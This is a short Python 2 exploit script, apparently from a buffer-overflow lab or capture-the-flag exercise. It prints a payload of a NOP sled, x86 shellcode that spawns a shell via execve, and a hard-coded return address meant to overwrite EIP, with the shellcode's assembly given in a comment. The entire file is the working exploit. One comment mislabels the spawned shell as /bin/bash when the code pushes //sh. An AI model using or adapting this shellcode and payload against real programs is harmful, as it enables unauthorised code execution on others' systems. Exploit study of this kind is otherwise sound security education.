#! /usr/bin/env python

# buf = bffff660
EIP = "\x10\xf6\xff\xbf"
#EIP = "BBBB"

"""
xor ecx, ecx    ; ecx = 0
mul ecx         ; edx = eax = 0
push ecx        ; '\0'
push 0x68732f2f ; "hs//"
push 0x6e69622f ; "nib/"
mov al, 0x0b    ; execve syscall
mov ebx, esp    ; ebx = "/bin/bash"
int 0x80        ; syscall execve[eax]("/bin/bash" [ebx], NULL [ecx], NULL [edx])
"""

SHELLCODE = "\x31\xC9\xF7\xE1\x51\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\xB0\x0b\x89\xE3\xCD\x80"

print '\x90' * 50 + SHELLCODE + '\x90' * (106-len(SHELLCODE)) + EIP